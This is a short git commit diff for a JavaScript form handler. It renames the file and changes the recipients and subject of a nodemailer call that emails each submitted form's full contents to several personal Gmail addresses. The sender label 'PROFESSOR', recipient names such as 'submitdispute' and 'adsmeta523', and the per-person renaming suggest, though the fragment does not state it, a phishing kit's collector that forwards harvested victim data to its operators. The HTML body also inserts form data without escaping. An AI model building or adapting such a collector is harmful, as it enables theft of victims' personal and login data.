10815aa716784901fb2da5a84a511a4188824b7d
tufailacjsm37-design <tufailacjsm37@gmail.com>
2026-02-21 11:28:44 +0500

    Update and rename qaisar.js to salman.js

--- salman.js
+++ salman.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,qaisarnizamani72@gmail.com",
-      subject: "qaisar",
+      to: "ta0134750@gmail.com,adsmeta523@gmail.com",
+      subject: "salman",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
